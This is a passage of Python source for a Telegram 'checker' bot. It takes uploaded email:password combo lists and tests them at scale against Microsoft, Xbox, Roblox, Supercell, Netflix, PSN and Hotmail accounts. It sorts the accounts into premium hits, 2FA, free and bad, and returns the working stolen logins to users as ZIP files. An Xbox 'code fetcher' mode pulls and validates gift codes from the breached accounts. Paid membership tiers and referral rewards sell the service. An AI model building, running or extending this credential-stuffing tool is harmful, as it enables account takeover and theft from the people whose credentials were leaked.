        total_active=max(active_user_jobs,1)
        per_job=max(1,total_threads//total_active)
        return per_job
    except Exception:return max(1,total_threads)

def run_all_in_one_job(job):
    try:
        job.status,job.start_time='Running',time.time();pin_scan_message(job.chat_id,job.msg_id);threading.Thread(target=update_ui_thread,args=(job,),daemon=True).start()
        user_data,_=get_user(job.chat_id);total_threads=get_user_thread_count(user_data);job.max_workers=get_balanced_thread_count(job.chat_id,total_threads)
        def process_combo(line):
            if job.stop_flag:return
            job.pause_event.wait()
            try:
                email,password=[x.strip() for x in line.strip().split(':',1)];r=process_single_account_all_in_one(email,password);hf=False
                if r["netflix"]["status"]=="PREMIUM":job.netflix_hits+=1;job.netflix_data.extend(r["netflix"]["data"]);hf=True
                elif r["netflix"]["status"] in ["VALID", "EMAIL_CHG"]:
                    job.valid_hot+=1;
                    if r["netflix"]["data"]: job.valid_hot_data.extend(r["netflix"]["data"])
                    else: job.valid_hot_data.append(f"{email}:{password} | Status: {r['netflix']['status']}")
                    hf=True
                if r["xbox"]["status"]=="PREMIUM":job.xbox_hits+=1;job.xbox_data.extend(r["xbox"]["data"]);hf=True
                if r["roblox"]["status"]=="PREMIUM":job.roblox_hits+=1;job.roblox_data.extend(r["roblox"]["data"]);hf=True
                if r["hotmail"]["status"]=="PREMIUM":job.hotmail_hits+=1;job.hotmail_data.extend(r["hotmail"]["data"]);hf=True
                if r["supercell"]["status"]=="PREMIUM":job.supercell_hits+=1;job.supercell_data.extend(r["supercell"]["data"]);hf=True
                if hf:job.hits+=1
                elif any(x in ["FREE", "NO_LINKED"] for x in [r["xbox"]["status"],r["roblox"]["status"],r["hotmail"]["status"],r["supercell"]["status"]]):job.free+=1;job.free_data.append(line)
                elif all(x=="BAD" for x in [r["xbox"]["status"],r["roblox"]["status"],r["hotmail"]["status"],r["supercell"]["status"],r["netflix"]["status"]]):job.bad+=1
                elif "2FA" in [r["xbox"]["status"],r["roblox"]["status"],r["hotmail"]["status"],r["supercell"]["status"]]:job.twofa+=1
                else:job.error+=1
                job.checked+=1;job.processed_lines+=1;e=time.time()-job.start_time
                if e>0:job.cpm=int((job.checked/e)*60)
            except Exception:job.error+=1;job.checked+=1
        with ThreadPoolExecutor(max_workers=job.max_workers) as executor:list(executor.map(process_combo,job.combos))
        if job.status!='Stopped':job.status='Completed'
        try:send_with_retry(bot.edit_message_text,get_all_in_one_stats_text(job),job.chat_id,job.msg_id)
        except Exception:pass
        unpin_scan_message(job.chat_id,job.msg_id);user,_=get_user(job.chat_id);user["total_hits"]+=job.hits;user["total_free_hits"]=user.get("total_free_hits",0)+job.free;user["today_scans"]+=job.processed_lines;user["total_scans"]+=job.processed_lines
        user["total_files"]=user.get("total_files",0)+1
        user["last_scan_time"]=datetime.now(timezone.utc).isoformat()
        user["xbox_hits"]=user.get("xbox_hits",0)+job.xbox_hits
        user["roblox_hits"]=user.get("roblox_hits",0)+job.roblox_hits
        user["supercell_hits"]=user.get("supercell_hits",0)+job.supercell_hits
        user["netflix_hits"]=user.get("netflix_hits",0)+job.netflix_hits
        save_db(db,DB_FILE);zb=io.BytesIO()
        with zipfile.ZipFile(zb,'w',zipfile.ZIP_DEFLATED) as zf:
            if job.netflix_data:zf.writestr("Netflix-Hits.txt","\n".join(job.netflix_data).encode('utf-8'))
            if job.xbox_data:zf.writestr("Xbox-Hits.txt","\n".join(job.xbox_data).encode('utf-8'))
            if job.roblox_data:zf.writestr("Roblox-Hits.txt","\n".join(job.roblox_data).encode('utf-8'))
            if job.supercell_data:zf.writestr("Supercell-Hits.txt","\n".join(job.supercell_data).encode('utf-8'))
            if job.hotmail_data:zf.writestr("Hotmail-Hits.txt","\n".join(job.hotmail_data).encode('utf-8'))
        zb.seek(0)
        if any([job.netflix_data,job.xbox_data,job.roblox_data,job.supercell_data,job.hotmail_data]):
            try:send_with_retry(bot.send_document,job.chat_id,document=("All_In_One_Hits.zip",zb),caption=f"✅ <b>All-in-One Scan Completed!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 Results:\n✅ Netflix: {job.netflix_hits}\n✅ XBOX: {job.xbox_hits}\n✅ Roblox: {job.roblox_hits}\n✅ Supercell: {job.supercell_hits}\n✅ H0TM4IL: {job.hotmail_hits}\n🔐 2FA: {job.twofa}\n❌ BAD: {job.bad}")
            except Exception:send_with_retry(bot.send_message,job.chat_id,f"✅ <b>All-in-One Scan Completed!</b>\n\n📊 Results:\n✅ Netflix: {job.netflix_hits}\n✅ XBOX: {job.xbox_hits}\n✅ Roblox: {job.roblox_hits}\n✅ Supercell: {job.supercell_hits}\n✅ H0TM4IL: {job.hotmail_hits}\n🔐 2FA: {job.twofa}\n❌ BAD: {job.bad}\n\n⚠️ Could not send ZIP file.")
        else:send_with_retry(bot.send_message,job.chat_id,f"✅ <b>All-in-One Scan Completed for:</b> <code>{trunc_name(job.file_name)}</code>\n⚠️ No working accounts were found in any service.")
    except Exception:pass

def process_checker_account_fetcher(account_tuple, codes_queue, job):
    if job.stop_flag: return
    email, password = account_tuple
    session = XboxCodeChecker.login_microsoft_account(email, password)
    if not session:
        return
    while not job.stop_flag:
        job.pause_event.wait()
        try:
            code = codes_queue.get(timeout=1)
        except queue.Empty:
            return
        if job.stop_flag:
            codes_queue.task_done()
            return
        try:
            result = XboxCodeChecker.validate_code(session, code)
            status = result.get('status')
            product_title = result.get('product_title', '')
            with jobs_lock:
                if status in ('VALID', 'BALANCE_CODE'):
                    job.valid_codes_list.append((code, "US", product_title))
                    job.valid += 1
                elif status == 'REGION_LOCKED':
                    job.region_locked_list.append((code, email))
                    job.region_locked_count += 1
                elif status == 'REDEEMED':
                    job.redeemed += 1
                elif status == 'EXPIRED':
                    job.expired += 1
                elif status == 'RATE_LIMITED':
                    job.rate_limited += 1
                    codes_queue.put(code)
                    codes_queue.task_done()
                    return
                else:
                    job.invalid += 1
        except Exception:
            with jobs_lock:
                job.invalid += 1
            codes_queue.task_done()
            return
        codes_queue.task_done()

def finish_fetcher_job(job):
    if job.status != 'Stopped': job.status = 'Completed'
    try: send_with_retry(bot.edit_message_text, get_xbox_fetcher_stats_text(job), job.chat_id, job.msg_id)
    except Exception: pass
    unpin_scan_message(job.chat_id, job.msg_id)

    user, _ = get_user(job.chat_id)
    user["today_scans"] += job.processed_lines
    user["total_scans"] += job.processed_lines
    save_db(db, DB_FILE)

    if job.valid_codes_list or job.region_locked_list:
        zb = io.BytesIO()
        with zipfile.ZipFile(zb, 'w', zipfile.ZIP_DEFLATED) as zf:
            if job.valid_codes_list:
                out = io.StringIO()
                for code, region, game_name in job.valid_codes_list:
                    title = game_name.split(' | ')[0] if ' | ' in game_name else game_name
                    out.write(f"{code} | {region} | ({title})\n")
                zf.writestr('Valid Xbox Codes.txt', out.getvalue().encode('utf-8'))
            if job.region_locked_list:
                out2 = io.StringIO()
                for code, email in job.region_locked_list:
                    out2.write(f"{code} | {email}\n")
                zf.writestr('Region_Locked.txt', out2.getvalue().encode('utf-8'))
        zb.seek(0)
        caption = f"✅ <b>Xbox Code Fetcher Completed!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ Valid Codes: <code>{job.valid}</code>\n🌎 Region Locked: <code>{job.region_locked_count}</code>\n♻️ Redeemed: <code>{job.redeemed}</code>\n⏰ Expired: <code>{job.expired}</code>\n❌ Invalid: <code>{job.invalid}</code>"
        try: send_with_retry(bot.send_document, job.chat_id, document=(f'Xbox Codes.zip', zb), caption=caption)
        except Exception: send_with_retry(bot.send_message, job.chat_id, caption)
    else:
        send_with_retry(bot.send_message, job.chat_id, f"✅ Scan Completed for: {trunc_name(job.file_name)}\n⚠️ No Vaild codes found.")

def run_xbox_fetcher_job(job):
    try:
        job.status, job.start_time = 'Running', time.time()
        pin_scan_message(job.chat_id, job.msg_id)
        threading.Thread(target=update_ui_thread, args=(job,), daemon=True).start()
        user_data, _ = get_user(job.chat_id)
        job.max_workers = 10

        all_codes = []
        all_codes_lock = threading.Lock()

        def pull_worker(line):
            if job.stop_flag: return
            job.pause_event.wait()
            try:
                email, password = [x.strip() for x in line.strip().split(':', 1)]
                codes = process_account_fetcher(email, password)
                if codes and not job.stop_flag:
                    with all_codes_lock:
                        new_codes = [c for c in codes if c not in all_codes]
                        all_codes.extend(new_codes)
                        job.codes_pulled = len(all_codes)
            except: pass
            finally:
                job.checked += 1
                job.processed_lines += 1
                el = time.time() - job.start_time
                if el > 0: job.cpm = int((job.checked / el) * 60)

        with ThreadPoolExecutor(max_workers=job.max_workers) as executor:
            list(executor.map(pull_worker, job.combos))

        if not all_codes or job.stop_flag:
            finish_fetcher_job(job)
            return

        codes_queue = queue.Queue()
        for code in all_codes:
            codes_queue.put(code)

        valid_accounts = [a.strip().split(':', 1) for a in job.combos if ':' in a]
        if not valid_accounts:
            finish_fetcher_job(job)
            return

        max_workers = min(job.max_workers, len(valid_accounts))
        active = {}
        index = 0

        def submit_more(executor):
            nonlocal index
            while len(active) < max_workers and index < len(valid_accounts) and not codes_queue.empty() and not job.stop_flag:
                checker_account = valid_accounts[index]
                index += 1
                fut = executor.submit(process_checker_account_fetcher, checker_account, codes_queue, job)
                active[fut] = True

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            submit_more(executor)
            while active and not codes_queue.empty() and not job.stop_flag:
                job.pause_event.wait()
                done, _ = wait(active.keys(), timeout=1, return_when=FIRST_COMPLETED)
                for fut in done:
                    active.pop(fut, None)
                    try: fut.result()
                    except: pass
                if not job.stop_flag:
                    submit_more(executor)

        while not codes_queue.empty():
            try:
                codes_queue.get_nowait()
                codes_queue.task_done()
            except Exception:
                break

        finish_fetcher_job(job)

    except Exception:
        try: finish_fetcher_job(job)
        except Exception: pass

def run_job(job):
    try:
        if job.scanner_mode==ScannerMode.ALL_IN_ONE.value:return run_all_in_one_job(job)
        if job.scanner_mode==ScannerMode.XBOX_CODE_FETCHER.value:return run_xbox_fetcher_job(job)

        job.status,job.start_time='Running',time.time();pin_scan_message(job.chat_id,job.msg_id);threading.Thread(target=update_ui_thread,args=(job,),daemon=True).start();user_data,_=get_user(job.chat_id);total_threads=get_user_thread_count(user_data);job.max_workers=get_balanced_thread_count(job.chat_id,total_threads)
        if job.scanner_mode == ScannerMode.NETFLIX.value: chk_cls = NetflixChecker
        elif job.scanner_mode == ScannerMode.SPEED.value: chk_cls = SpeedModeChecker
        else: chk_cls=RobloxChecker if job.scanner_mode==ScannerMode.ROBLOX.value else PSNV2Checker if job.scanner_mode==ScannerMode.PSN_V2.value else SupercellChecker if job.scanner_mode==ScannerMode.SUPERCELL.value else XboxTitanChecker
        def process_combo(line):
            if job.stop_flag:return
            job.pause_event.wait()
            try:
                e,p=[x.strip() for x in line.strip().split(':',1)]
                if job.scanner_mode == ScannerMode.SPEED.value:
                    st, hits = chk_cls().check_account(e, p)
                    if st == "PREMIUM":
                        job.hits += 1
                        job.hits_data.extend(hits)
                    elif st == "2FA":
                        job.twofa += 1
                        job.twofa_data.append(line)
                    elif st == "BAD":
                        job.bad += 1
                        job.bad_data.append(line)
                    else: job.error += 1
                elif job.scanner_mode == ScannerMode.PSN_V2.value:
                    st, hits = chk_cls().check_account(e, p)
                    if st == "PREMIUM":
                        job.hits += 1
                        job.hits_data.extend(hits)
                    elif st == "NO_LINKED":
                        job.free += 1
                        job.free_data.extend(hits)
                    elif st == "2FA": job.twofa += 1
                    elif st == "BAD": job.bad += 1
                    else: job.error += 1
                elif job.scanner_mode == ScannerMode.NETFLIX.value:
                    st, hits = chk_cls().check_account(e, p)
                    if st == "PREMIUM":
                        job.hits += 1
                        job.hits_data.extend(hits)
                    elif st == "EMAIL_CHG":
                        job.email_changed += 1
                        job.email_changed_data.extend(hits)
                    elif st == "VALID":
                        job.valid += 1
                        job.valid_data.extend(hits)
                    elif st == "BAD": job.bad += 1
                    else: job.error += 1
                else:
                    st, hits = chk_cls().check_account(e, p)
                    if st=="PREMIUM":job.hits+=1;job.hits_data.extend(hits)
                    elif st=="FREE":job.free+=1;job.free_data.append(line)
                    elif st=="BAD":job.bad+=1
                    elif st=="2FA":job.twofa+=1
                    else:job.error+=1
                job.checked+=1;job.processed_lines+=1;el=time.time()-job.start_time
                if el>0:job.cpm=int((job.checked/el)*60)
            except Exception:job.error+=1;job.checked+=1
        with ThreadPoolExecutor(max_workers=job.max_workers) as executor:list(executor.map(process_combo,job.combos))
        if job.status!='Stopped':job.status='Completed'
        try:send_with_retry(bot.edit_message_text,get_stats_text(job),job.chat_id,job.msg_id)
        except Exception:pass
        unpin_scan_message(job.chat_id,job.msg_id);user,_=get_user(job.chat_id);user["total_hits"]+=job.hits;user["total_free_hits"]=user.get("total_free_hits",0)+job.free;user["today_scans"]+=job.processed_lines;user["total_scans"]+=job.processed_lines
        user["total_files"]=user.get("total_files",0)+1
        user["last_scan_time"]=datetime.now(timezone.utc).isoformat()
        if job.scanner_mode==ScannerMode.XBOX.value:user["xbox_hits"]=user.get("xbox_hits",0)+job.hits
        elif job.scanner_mode==ScannerMode.ROBLOX.value:user["roblox_hits"]=user.get("roblox_hits",0)+job.hits
        elif job.scanner_mode==ScannerMode.SUPERCELL.value:user["supercell_hits"]=user.get("supercell_hits",0)+job.hits
        elif job.scanner_mode==ScannerMode.NETFLIX.value:user["netflix_hits"]=user.get("netflix_hits",0)+job.hits
        elif job.scanner_mode==ScannerMode.PSN_V2.value:user["psn_hits"]=user.get("psn_hits",0)+job.hits
        elif job.scanner_mode==ScannerMode.SPEED.value:user["speed_hits"]=user.get("speed_hits",0)+job.hits
        save_db(db,DB_FILE)
        if job.scanner_mode == ScannerMode.SPEED.value:
            if job.hits_data or job.bad_data or job.twofa_data:
                zb = io.BytesIO()
                with zipfile.ZipFile(zb, 'w', zipfile.ZIP_DEFLATED) as zf:
                    if job.hits_data: zf.writestr("Hits.txt", "\n".join(job.hits_data).encode('utf-8'))
                    if job.bad_data: zf.writestr("Bad.txt", "\n".join(job.bad_data).encode('utf-8'))
                    if job.twofa_data: zf.writestr("2Fa.txt", "\n".join(job.twofa_data).encode('utf-8'))
                zb.seek(0)
                try: send_with_retry(bot.send_document, job.chat_id, document=("SpeedMode_Results.zip", zb), caption=f"✅ <b>Speed Mode Scan Completed!</b>\n🎯 Total Hits: <code>{job.hits}</code>\n🔐 2FA: <code>{job.twofa}</code>\n❌ BAD: <code>{job.bad}</code>")
                except Exception: send_with_retry(bot.send_message, job.chat_id, f"✅ <b>Speed Mode Scan Completed!</b>\n🎯 Total Hits: <code>{job.hits}</code>\n\n⚠️ Could not send ZIP file.")
            else: send_with_retry(bot.send_message,job.chat_id,f"✅ <b>Scan Completed for:</b> <code>{trunc_name(job.file_name)}</code>\n⚠️ No working accounts were found.")
        elif job.scanner_mode == ScannerMode.PSN_V2.value:
            if job.hits_data or job.free_data:
                zb = io.BytesIO()
                with zipfile.ZipFile(zb, 'w', zipfile.ZIP_DEFLATED) as zf:
                    if job.hits_data: zf.writestr("PSN-Hits.txt", "\n".join(job.hits_data).encode('utf-8'))
                    if job.free_data: zf.writestr("No-Linked.txt", "\n".join(job.free_data).encode('utf-8'))
                zb.seek(0)
                try: send_with_retry(bot.send_document, job.chat_id, document=("PSN_V2_Results.zip", zb), caption=f"✅ Scan Completed!\n🎯 Total Hits: {job.hits}\n🆓 No Linked: {job.free}")
                except Exception: send_with_retry(bot.send_message, job.chat_id, f"✅ Scan Completed!\n🎯 Total Hits: {job.hits}\n🆓 No Linked: {job.free}\n\n⚠️ Could not send ZIP file.")
            else: send_with_retry(bot.send_message,job.chat_id,f"✅ Scan Completed for: {trunc_name(job.file_name)}\n⚠️ No working accounts were found.")
        elif job.scanner_mode == ScannerMode.NETFLIX.value:
            if job.hits_data or job.valid_data or job.email_changed_data:
                zb = io.BytesIO()
                with zipfile.ZipFile(zb, 'w', zipfile.ZIP_DEFLATED) as zf:
                    if job.hits_data: zf.writestr("Netflix-Hits.txt", "\n".join(job.hits_data).encode('utf-8'))
                    valid_combo = job.valid_data + job.email_changed_data
                    if valid_combo: zf.writestr("Valid-HOT.txt", "\n".join(valid_combo).encode('utf-8'))
                zb.seek(0)
                try: send_with_retry(bot.send_document, job.chat_id, document=("Netflix_Results.zip", zb), caption=f"✅ <b>Netflix Scan Completed!</b>\n🎯 Total Hits: <code>{job.hits}</code>\n🆓 Valid: <code>{job.valid}</code>\n🟦 Email Changed: <code>{job.email_changed}</code>")
                except Exception: send_with_retry(bot.send_message, job.chat_id, f"✅ <b>Netflix Scan Completed!</b>\n🎯 Total Hits: <code>{job.hits}</code>\n\n⚠️ Could not send ZIP file.")
            else: send_with_retry(bot.send_message,job.chat_id,f"✅ <b>Scan Completed for:</b> <code>{trunc_name(job.file_name)}</code>\n⚠️ No working accounts were found.")
        elif job.scanner_mode == ScannerMode.SUPERCELL.value:
            if job.hits_data:
                try:send_with_retry(bot.send_document,job.chat_id,document=("Supercell-Hits.txt","\n".join(job.hits_data).encode('utf-8')),caption=f"✅ <b>HIT Accounts Found!</b>\n🎯 ❘ Total Hits: <code>{job.hits}</code>")
                except Exception:send_with_retry(bot.send_message,job.chat_id,f"✅ <b>HIT Accounts Found!</b>\n🎯 ❘ Total Hits: <code>{job.hits}</code>\n\n⚠️ Could not send file.")
            else:send_with_retry(bot.send_message,job.chat_id,f"✅ <b>Scan Completed for:</b> <code>{trunc_name(job.file_name)}</code>\n⚠️ No working accounts were found.")
        else:
            hf=get_mode_filename(job.scanner_mode,"hits")
            if job.hits_data:
                try:send_with_retry(bot.send_document,job.chat_id,document=(hf,"\n".join(job.hits_data).encode('utf-8')),caption=f"✅ <b>HIT Accounts Found!</b>\n🎯 ❘ Total Hits: <code>{job.hits}</code>")
                except Exception:send_with_retry(bot.send_message,job.chat_id,f"✅ <b>HIT Accounts Found!</b>\n🎯 ❘ Total Hits: <code>{job.hits}</code>\n\n⚠️ Could not send file.")
            else:send_with_retry(bot.send_message,job.chat_id,f"✅ <b>Scan Completed for:</b> <code>{trunc_name(job.file_name)}</code>\n⚠️ No working accounts were found.")
    except Exception:pass

def worker_queue_processor():
    while not shutdown_flag:
        try:
            job=job_queue.get(timeout=1)
            with jobs_lock:current_jobs.append(job)
            try:run_job(job)
            except Exception:pass
            with jobs_lock:
                if job in current_jobs:current_jobs.remove(job)
            job_queue.task_done()
        except queue.Empty:continue
        except Exception:time.sleep(1)
threading.Thread(target=worker_queue_processor,daemon=True).start()

def check_subscription(user_id):
    if not force_subs:return True
    for sub in force_subs:
        try:
            if bot.get_chat_member(sub.split('|')[0],user_id).status not in ['member','administrator','creator']:return False
        except Exception:return False
    return True

def get_ping():
    start=time.time()
    try:requests.get("https://api.telegram.org",timeout=3);return int((time.time()-start)*1000)
    except Exception:return 0

def parse_time_duration(d):
    match=re.match(r'^(\d+)([hdm])$',d.lower().strip())
    if not match:return None
    v,u=int(match.group(1)),match.group(2)
    return timedelta(hours=v) if u=='h' else timedelta(days=v) if u=='d' else timedelta(days=v*30) if u=='m' else None

def create_backup():shutil.copyfile(SQLITE_DB,BACKUP_FILE);return BACKUP_FILE

def restore_backup(bf):
    try:
        shutil.copyfile(bf,SQLITE_DB);global db,force_subs,banned_users,CUSTOM_THREADS,rewards_db,gift_codes_db,disabled_modes
        d,f,b,t,rd,gd,dm=load_db_sqlite();db.clear();db.update(d);force_subs.clear();force_subs.extend(f);banned_users.clear();banned_users.extend(b);CUSTOM_THREADS.update(t);rewards_db.clear();rewards_db.update(rd);gift_codes_db.clear();gift_codes_db.update(gd);disabled_modes.clear();disabled_modes.extend(dm);return True
    except Exception:return False

def signal_handler(sig,frame):global shutdown_flag;shutdown_flag=True;sys.exit(0)
signal.signal(signal.SIGINT,signal_handler);signal.signal(signal.SIGTERM,signal_handler)

@bot.message_handler(content_types=['pinned_message'])
@retry_on_error
def delete_pinned_service_message(m):
    try:send_with_retry(bot.delete_message,m.chat.id,m.message_id)
    except Exception:pass

def cancel_current_operation(m):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    send_with_retry(bot.send_message,m.chat.id,"✅ Operation cancelled.");send_welcome(m)

@bot.my_chat_member_handler()
@retry_on_error
def handle_bot_block(message: telebot.types.ChatMemberUpdated):
    if message.new_chat_member.status == 'kicked':
        try:send_with_retry(bot.send_message, "8744777152", f"⚠️ <b>User Blocked Bot!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: <code>{message.chat.id}</code>\n👤 Name: {message.chat.first_name}\n🔗 Username: @{message.chat.username or 'No username'}\n⏰ Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception:pass

@bot.message_handler(commands=['start'])
@retry_on_error
def send_welcome(m):
    user_id=str(m.chat.id)
    if user_id in banned_users:bot.reply_to(m,"🚫 <b>You have been banned from using this bot.</b>\n\nIf you think this is a mistake, contact the bot owner.");return
    user,is_new=get_user(user_id);update_user_info(user_id,m.from_user)
    if force_subs and not check_subscription(m.chat.id) and user_id!="8744777152":
        mk=InlineKeyboardMarkup()
        for sub in force_subs:
            try:
                cid,clink=sub.split('|')[0],sub.split('|')[1] if '|' in sub else None;ch=bot.get_chat(cid)
                mk.add(InlineKeyboardButton(f"📢 {ch.title}",url=clink if clink else f"https://t.me/{ch.username}" if ch.username else f"https://t.me/c/{str(cid)[4:]}",style="primary"))
            except Exception:mk.add(InlineKeyboardButton(f"📢 Join Channel",url="https://t.me/",style="primary"))
        mk.add(InlineKeyboardButton("✅ Check Membership",callback_data="check_sub",style="success"))
        bot.reply_to(m,"<b>🔒 CHANNEL MEMBERSHIP REQUIRED</b>\n\nTo use this bot, you must join our channel first!\n\n👇 Click the button below to join, then press <b>✅ Check Membership.</b>",reply_markup=mk);return
    parts=m.text.split()
    if len(parts)>1 and parts[1]!=user_id and parts[1] in db and user["referred_by"] is None and is_new:
        user["referred_by"]=parts[1];db[parts[1]]["referrals"]+=1;save_db(db,DB_FILE);send_with_retry(bot.send_message,parts[1],f"🎉 <b>Congratulations!</b>\nA new user joined via your link.\n🎁 Your Daily Limit increased by <b>+500 lines!</b>");send_with_retry(bot.send_message,m.chat.id,f"🎁 <b>Welcome!</b>\nYou joined via {parts[1]}'s referral link.\nYou have been added to the system successfully!")
        if parts[1]=="8744777152":send_with_retry(bot.send_message,"8744777152",f"🔔 <b>New User Joined!</b>\n\n👤 New User: @{m.from_user.username or 'No username'} (ID: {user_id})\n📅 ❘ Joined via owner link!")
    if user_id!="8744777152" and is_new:send_with_retry(bot.send_message,"8744777152",f"<b>👤 New User Joined!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: <code>{user_id}</code>\n👤 Username: @{m.from_user.username or 'No username'}\n📅 Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
    dl=get_user_daily_limit(user_id)
    rem = dl - user.get("today_scans", 0) if dl != float('inf') else "∞"
    dld = dl if dl != float('inf') else "∞"
    mem=user.get("membership",MembershipStatus.FREE.value);exp=user.get("membership_expiry");dl_left=" - "
    if exp:
        try:dl_left=f"{(datetime.fromisoformat(exp)-datetime.now(timezone.utc)).days} days"
        except Exception:pass
    ut=get_user_thread_count(user);mt=get_max_threads_for_user(user);cm=user.get("scanner_mode",ScannerMode.XBOX.value)
    bot.reply_to(m,f"𖠵 <b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗤𝟵 • 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📤 Send your combo list (.txt file)</b>\n︙ <i>Format: mail:pass (one per line)</i>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>📊 Your Dashboard:</b>\n⌯ 🧵 Threads: <code>{ut} / {mt}</code>\n⌯ 👑 Plan: <code>{mem}</code>\n⌯ 📅 Days Left: <code>{dl_left}</code>\n⌯ 📈 Daily Limit: <code>{rem} / {dld} lines</code>\n⌯ 📡 Mode: <code>{cm} Check</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⦿ <b>Select an option from the menu below:</b>",reply_markup=get_main_markup(m))

@bot.message_handler(commands=['pause','resume','stop'])
@retry_on_error
def handle_scan_commands(m):
    user_id,cmd=str(m.chat.id),m.text[1:].lower()
    with jobs_lock:uj=next((job for job in current_jobs if job.chat_id==user_id and job.status in ['Running','Paused']),None)
    if not uj:bot.reply_to(m,"⚠️ <b>No active scan found.</b>\n\nPlease start a scan by sending a combo file first.");return
    if cmd=='pause':
        if uj.status=='Running':
            uj.status='Paused';uj.pause_event.clear();uj.pause_start_time=time.time();threading.Thread(target=auto_resume_job,args=(uj,),daemon=True).start()
            bot.reply_to(m,"⏸ <b>Scan Paused</b>\n\nScan will auto-resume after 30 seconds.\nUse /resume to resume immediately.")
        else:bot.reply_to(m,f"⚠️ <b>Scan is not running.</b>\nCurrent status: <code>{uj.status}</code>")
    elif cmd=='resume':
        if uj.status=='Paused':uj.status='Running';uj.pause_event.set();uj.pause_start_time=None;bot.reply_to(m,"▶️ <b>Scan Resumed</b>\n\nScanning continues...")
        else:bot.reply_to(m,f"⚠️ <b>No paused scan found.</b>\nCurrent status: <code>{uj.status}</code>")
    elif cmd=='stop':
        if uj.status in ['Running','Paused']:uj.status='Stopped';uj.stop_flag=True;uj.pause_event.set();unpin_scan_message(uj.chat_id,uj.msg_id);bot.reply_to(m,"⏹ <b>Scan Stopped</b>\n\nResults will be sent shortly.")

def get_mode_description(cm):
    if cm == ScannerMode.XBOX.value:
        return "🟩 Xbox Mode\n✅ Checks Xbox Game Pass subscriptions\n✅ Shows EA Play & Ubisoft+ details\n✅ Displays subscription expiry dates\n✅ Shows payment method & balance\n✅ Extracts account profile info"
    elif cm == ScannerMode.ROBLOX.value:
        return "🟥 Roblox Mode\n✅ Checks Roblox linked accounts\n✅ Extracts Roblox username\n✅ Shows friends count & acc creation date\n✅ Detects banned accounts\n✅ Shows profile link"
    elif cm == ScannerMode.PSN_V2.value:
        return "🟦 PSN V2 Mode\n✅ Advanced PSN checks\n✅ Extracts Orders, Emails, Region\n✅ Detects Email Changes\n✅ Saved to ZIP"
    elif cm == ScannerMode.SUPERCELL.value:
        return "🟨 Supercell Mode\n✅ Checks Supercell linked accounts\n✅ Detects Clash of Clans, Clash Royale\n✅ Detects Brawl Stars, Hay Day\n✅ Shows all linked Supercell games"
    elif cm == ScannerMode.NETFLIX.value:
        return "🟥 Netflix Mode\n✅ Checks Netflix linked accounts\n✅ Extracts Netflix plan details\n✅ Detects Valid and Email Changed\n✅ Saves results in ZIP file"
    elif cm == ScannerMode.SPEED.value:
        return "⚡ Speed Mode\n✅ Fast Hotmail/Outlook Check\n✅ Detects Valid Hits & 2FA Accounts\n✅ Separates Bad & Errors\n✅ Saves all results in ZIP file"
    elif cm == ScannerMode.XBOX_CODE_FETCHER.value:
        return "💎 Xbox code Fetcher\n✅ Pulls and verifies Xbox codes\n✅ Highly stable and efficient\n✅ Only 1 file at a time\n✅ Saves Valid and Region Locked to files"
    elif cm == ScannerMode.ALL_IN_ONE.value:
        return "👑 ALL IN ONE Mode (VIP Only)\n✅ Checks ALL services at once\n✅ One scan, all results\n✅ Saves results in ZIP file\n✅ Real-time stats per service"
    return ""

@bot.message_handler(content_types=['document'])
@retry_on_error
def handle_document(m):
    user_id,is_owner=str(m.chat.id),str(m.chat.id)=="8744777152"
    if user_id in banned_users:bot.reply_to(m,"🚫 <b>You have been banned from using this bot.</b>");return
    if not BOT_RUNNING and not is_owner:bot.reply_to(m,"⚠️ <b>Bot is currently under maintenance.</b>\nPlease try again later.");return
    if force_subs and not check_subscription(m.chat.id) and not is_owner:
        mk=InlineKeyboardMarkup()
        for sub in force_subs:
            try:
                cid,clink=sub.split('|')[0],sub.split('|')[1] if '|' in sub else None;ch=bot.get_chat(cid)
                mk.add(InlineKeyboardButton(f"📢 {ch.title}",url=clink if clink else f"https://t.me/{ch.username}" if ch.username else f"https://t.me/c/{str(cid)[4:]}",style="primary"))
            except Exception:mk.add(InlineKeyboardButton(f"📢 Join Channel",url="https://t.me/",style="primary"))
        mk.add(InlineKeyboardButton("✅ Check Membership",callback_data="check_sub",style="success"));bot.reply_to(m,"<b>🔒 CHANNEL MEMBERSHIP REQUIRED</b>\n\nTo use this bot, you must join our channel first!\n\n👇 Click the button below to join, then press <b>✅ Check Membership.</b>",reply_markup=mk);return
    try:
        if m.document.file_size>5*1024*1024:bot.reply_to(m,"❌ <b>Error!</b> The file size exceeds the 5MB maximum limit.");return
        user,_=get_user(user_id);update_user_info(user_id,m.from_user);mem,is_mem=user.get("membership"),user.get("membership")!=MembershipStatus.FREE.value
        cm=user.get("scanner_mode",ScannerMode.XBOX.value)
        if cm in disabled_modes and not is_owner:
            bot.reply_to(m,f"⚠️ <b>Mode Disabled!</b>\n\nThe <code>{cm}</code> scanner mode is currently disabled by the administrator for maintenance or updates. Please try again later or choose another mode from Settings.")
            return

        if cm == ScannerMode.XBOX_CODE_FETCHER.value:
            with jobs_lock:
                active_count = sum(1 for j in current_jobs if j.chat_id == user_id and j.status in ['Running', 'Paused']) + sum(1 for j in list(job_queue.queue) if j.chat_id == user_id)
            if active_count >= 1:
                bot.reply_to(m, "⚠️ <b>Warning!</b> You can only process 1 file at a time in 💎 Xbox code Fetcher mode.")
                return

        if not is_owner and is_user_busy(user_id,user):
            bot.reply_to(m,"⚠️ <b>Warning!</b> You already have 3 files in progress. Please wait." if mem in [MembershipStatus.VIP.value,MembershipStatus.BASIC.value] else "⚠️ <b>Warning!</b> You already have a file in progress or queue.");return
